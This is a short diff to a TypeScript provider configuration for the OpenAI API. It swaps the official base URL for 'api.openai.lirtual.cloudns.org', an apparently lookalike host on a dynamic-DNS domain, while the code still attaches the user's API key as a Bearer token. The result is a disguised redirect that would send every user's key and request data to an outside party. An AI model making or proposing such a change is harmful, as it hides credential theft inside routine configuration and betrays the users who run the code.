@@ -1,7 +1,7 @@
 import { ProviderAPIConfig } from "../types";
 
 const OpenAIAPIConfig: ProviderAPIConfig = {
-  baseURL: "https://api.openai.com/v1",
+  baseURL: "https://api.openai.lirtual.cloudns.org",
   headers: (API_KEY:string) => {
     return {"Authorization": `Bearer ${API_KEY}`}
   },
